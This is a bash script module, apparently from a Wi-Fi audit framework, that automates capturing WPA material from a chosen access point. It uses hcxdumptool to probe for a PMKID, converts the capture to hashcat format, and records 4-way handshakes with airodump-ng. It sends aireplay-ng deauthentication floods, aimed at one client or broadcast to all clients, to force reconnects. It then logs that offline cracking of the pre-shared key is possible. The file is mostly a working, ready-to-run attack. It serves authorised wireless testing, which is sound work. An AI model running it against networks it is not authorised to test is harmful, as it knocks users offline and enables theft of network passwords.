#!/usr/bin/env bash
# MODULE_META
# NAME="WPA Handshake & PMKID Capture"
# CATEGORY="D"
# DEPS="A1"
# CRITICAL="yes"
# TOOLS="aireplay-ng,aircrack-ng,hcxdumptool,hcxpcapngtool"
# DESC="Capture PMKID (primary) and 4-way EAPOL handshake; offers inline hashcat cracking on completion"
# REQS="monitor_iface,target_ssid,target_bssid,target_channel"
# PCAP="yes"
# TIMED="yes"
# PROMPTS="target_client"
# DECODE="wifi_mgmt"

#===============================================================================
#  modules/d1_wpa_handshake.sh
#  D1: WPA Handshake & PMKID Capture (Golden Wrapper)
#===============================================================================

set -euo pipefail

# Inputs from Environment
INTERFACE="${MONITOR_INTERFACE:-}"
BSSID="${GUEST_BSSID:-}"
CHANNEL="${GUEST_CHANNEL:-}"
CAPTURE_TIME="${CAPTURE_TIME:-60}"
SESSION_DIR="${SESSION_DIR:-.}"
EVIDENCE_DIR="${SESSION_EVIDENCE_DIR:-${SESSION_DIR}/evidence}"
ASTRA_BIN="${ASTRA_BIN:-wifi-astra}"
TC_ID="D1"
OUTPUT_BASE="${EVIDENCE_DIR}/${TC_ID}_capture"
TARGET_CLIENT="${TARGET_CLIENT:-}" 

if [[ -z "$INTERFACE" || -z "$BSSID" ]]; then
    echo "[!] MONITOR_INTERFACE or GUEST_BSSID not set."
    exit 1
fi

echo "[*] Starting WPA material capture for ${BSSID} (Channel: ${CHANNEL:-auto})..."

# 1. Start Telemetry in Background (bounded)
MAX_TEL=$(( CAPTURE_TIME + 30 ))
(
    ELAPSED=0
    while [[ "${ASTRA_INDEFINITE:-}" == "true" || $ELAPSED -lt $MAX_TEL ]]; do
        PCT=$(( 10 + (ELAPSED * 80 / MAX_TEL) ))
        [[ $PCT -gt 90 ]] && PCT=90
        "$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent "$PCT" --status "Executing handshake & PMKID capture..."
        sleep 5; ELAPSED=$((ELAPSED + 5))
    done
) &
TEL_PID=$!

# 2. Run Primary Tools
PMKID_SUCCESS=0

if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
    # Phase 1: hcxdumptool PMKID capture
    FILTER_FILE=$(mktemp)
    echo "${BSSID}" | tr -d ':' | tr '[:upper:]' '[:lower:]' > "$FILTER_FILE"
    echo "[PMKID] Probing ${BSSID} for PMKID (15s)..."
    timeout --foreground 15 hcxdumptool -i "$INTERFACE" --filterlist_ap="$FILTER_FILE" --filtermode=2 --enable_status=1 -o "${OUTPUT_BASE}_hcxdump.pcapng" 2>&1 || true
    rm -f "$FILTER_FILE"

    # Convert pcapng → hashcat 22000 format (PMKID + EAPOL)
    if [[ -f "${OUTPUT_BASE}_hcxdump.pcapng" ]]; then
        hcxpcapngtool "${OUTPUT_BASE}_hcxdump.pcapng" -o "${OUTPUT_BASE}_pmkid.hc22000" 2>/dev/null || true
    fi
    if [[ -s "${OUTPUT_BASE}_pmkid.hc22000" ]]; then
        echo "[PMKID] CAPTURED — PMKID extracted for ${BSSID}. Ready for offline crack."
        PMKID_SUCCESS=1
    else
        echo "[PMKID] Not captured — AP may not support PMKID or was not in range during probe."
        echo "[HANDSHAKE] Switching to 4-way handshake capture..."
    fi

    # Phase 2: Handshake Capture
    echo "[HANDSHAKE] Starting airodump-ng on channel ${CHANNEL:-6} — timeout ${CAPTURE_TIME}s..."
    BROADCAST_DEAUTH=0
    if [[ -n "$TARGET_CLIENT" ]]; then
        echo "[HANDSHAKE] Target client ${TARGET_CLIENT} — deauth every 15s to force reconnect."
    else
        echo "[HANDSHAKE] No target client selected."
        echo -n "[HANDSHAKE] Broadcast deauth all clients on ${BSSID} to force handshake? [y/N]: "
        read -r _DEAUTH_CHOICE </dev/tty
        if [[ "${_DEAUTH_CHOICE,,}" == "y" ]]; then
            BROADCAST_DEAUTH=1
            echo "[HANDSHAKE] Broadcast deauth enabled — sending every 15s. WARNING: disconnects all AP clients."
        else
            echo "[HANDSHAKE] Passive capture only — waiting for organic client reconnects."
        fi
    fi
    timeout --foreground "$CAPTURE_TIME" airodump-ng --bssid "$BSSID" --channel "${CHANNEL:-6}" --write "${OUTPUT_BASE}_handshake" --output-format pcap "$INTERFACE" > /dev/null 2>&1 &
    AIRODUMP_PID=$!

    HANDSHAKE_FILE="${OUTPUT_BASE}_handshake-01.cap"
    ELAPSED=0
    SUCCESS=0
    while [[ "${ASTRA_INDEFINITE:-}" == "true" || $ELAPSED -lt $CAPTURE_TIME ]]; do
        if (( ELAPSED > 0 )) && (( ELAPSED % 15 == 0 )); then
            if [[ -n "$TARGET_CLIENT" ]]; then
                echo "[DEAUTH] Sending deauth to ${TARGET_CLIENT} (${ELAPSED}s)..."
                aireplay-ng --deauth 5 -a "$BSSID" -c "$TARGET_CLIENT" "$INTERFACE" 2>/dev/null || true
            elif [[ "$BROADCAST_DEAUTH" -eq 1 ]]; then
                echo "[DEAUTH] Broadcast deauth on ${BSSID} (${ELAPSED}s)..."
                aireplay-ng --deauth 5 -a "$BSSID" "$INTERFACE" 2>/dev/null || true
            fi
        fi
        if [[ -f "$HANDSHAKE_FILE" ]]; then
            if aircrack-ng "$HANDSHAKE_FILE" 2>/dev/null | grep -q "1 handshake"; then
                echo "[HANDSHAKE] CAPTURED — Valid 4-way handshake detected at ${ELAPSED}s."
                SUCCESS=1; break
            fi
        fi
        if (( ELAPSED > 0 )) && (( ELAPSED % 10 == 0 )); then
            REMAIN=$(( CAPTURE_TIME - ELAPSED ))
            if [[ "${ASTRA_INDEFINITE:-}" == "true" ]]; then
                echo "[${ELAPSED}s] Still listening... Press Ctrl+C to stop."
            else
                echo "[${ELAPSED}/${CAPTURE_TIME}s] Still waiting for handshake (${REMAIN}s remaining)..."
            fi
        fi
        sleep 2; ((ELAPSED+=2))
    done
    kill "$AIRODUMP_PID" 2>/dev/null || true
    [[ $PMKID_SUCCESS -eq 1 ]] && SUCCESS=1
else
    # Background Execution
    (
        FILTER_FILE=$(mktemp)
        echo "${BSSID}" | tr -d ':' | tr '[:upper:]' '[:lower:]' > "$FILTER_FILE"
        timeout 15 hcxdumptool -i "$INTERFACE" --filterlist_ap="$FILTER_FILE" --filtermode=2 --enable_status=1 -o "${OUTPUT_BASE}_hcxdump.pcapng" > /dev/null 2>&1 || true
        rm -f "$FILTER_FILE"

        # Convert pcapng → hashcat 22000 format
        if [[ -f "${OUTPUT_BASE}_hcxdump.pcapng" ]]; then
            hcxpcapngtool "${OUTPUT_BASE}_hcxdump.pcapng" -o "${OUTPUT_BASE}_pmkid.hc22000" > /dev/null 2>&1 || true
        fi

        airodump-ng --bssid "$BSSID" --channel "${CHANNEL:-6}" --write "${OUTPUT_BASE}_handshake" --output-format pcap "$INTERFACE" > /dev/null 2>&1 &
        AIRODUMP_PID=$!

        HANDSHAKE_FILE="${OUTPUT_BASE}_handshake-01.cap"
        ELAPSED=0
        while [[ "${ASTRA_INDEFINITE:-}" == "true" || $ELAPSED -lt $CAPTURE_TIME ]]; do
            if [[ -n "$TARGET_CLIENT" ]] && (( ELAPSED > 0 )) && (( ELAPSED % 15 == 0 )); then
                aireplay-ng --deauth 5 -a "$BSSID" -c "$TARGET_CLIENT" "$INTERFACE" > /dev/null 2>&1 || true
            fi
            if [[ -f "$HANDSHAKE_FILE" ]]; then
                if aircrack-ng "$HANDSHAKE_FILE" 2>/dev/null | grep -q "1 handshake"; then
                    break
                fi
            fi
            sleep 2; ((ELAPSED+=2))
        done
        kill "$AIRODUMP_PID" 2>/dev/null || true
    ) > /dev/null 2>&1 &
    TOOL_PID=$!
    wait $TOOL_PID || true
fi

# 3. Cleanup and Final Signal
kill $TEL_PID 2>/dev/null || true

# Standardize output path
FINAL_FILE="${OUTPUT_BASE}_handshake.cap"
HANDSHAKE_FILE="${OUTPUT_BASE}_handshake-01.cap"
if [[ -f "$HANDSHAKE_FILE" ]]; then
    cp "$HANDSHAKE_FILE" "$FINAL_FILE"
fi

# SUCCESS check — verify handshake and/or PMKID
SUCCESS=0
CAPTURE_TYPE=""
PMKID_FILE="${OUTPUT_BASE}_pmkid.hc22000"

if [[ -f "$FINAL_FILE" ]] && aircrack-ng "$FINAL_FILE" 2>/dev/null | grep -q "1 handshake"; then
    SUCCESS=1
    CAPTURE_TYPE="4-way handshake"
fi
if [[ -s "$PMKID_FILE" ]]; then
    SUCCESS=1
    CAPTURE_TYPE="${CAPTURE_TYPE:+${CAPTURE_TYPE} + }PMKID"
fi

if [[ $SUCCESS -eq 1 ]]; then
    "$ASTRA_BIN" record-finding \
        --session-dir "$SESSION_DIR" \
        --tc "$TC_ID" \
        --type vulnerability \
        --name "WPA Material Captured: ${CAPTURE_TYPE}" \
        --desc "Captured ${CAPTURE_TYPE} for BSSID ${BSSID}. Offline PSK cracking is now possible." \
        --severity CRITICAL \
        --evidence "$FINAL_FILE" \
        --rationale "Offline brute-force of captured ${CAPTURE_TYPE} can recover the WPA PSK."
else
    "$ASTRA_BIN" record-finding \
        --session-dir "$SESSION_DIR" \
        --tc "$TC_ID" \
        --type vulnerability \
        --name "[$TC_ID] Audit Complete — No material captured" \
        --desc "Attempted PMKID probe and ${CAPTURE_TIME}s handshake capture for BSSID ${BSSID}. No WPA material obtained." \
        --severity INFO \
        --evidence "$FINAL_FILE" \
        --rationale "Handshake capture requires a client to connect/reconnect during the capture window. Try running A4 first to identify active clients, then re-run D1 with a target client selected."
fi

"$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 100 --status "Mission Complete"

# Hold window if in tactical mode so user can see final output/errors
if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
    echo -e "\n${ASTRA_COLOR_BOLD:-}[*] Mission Complete. Window will close in 5s...${ASTRA_COLOR_RESET:-}"
    sleep 5
fi

exit 0
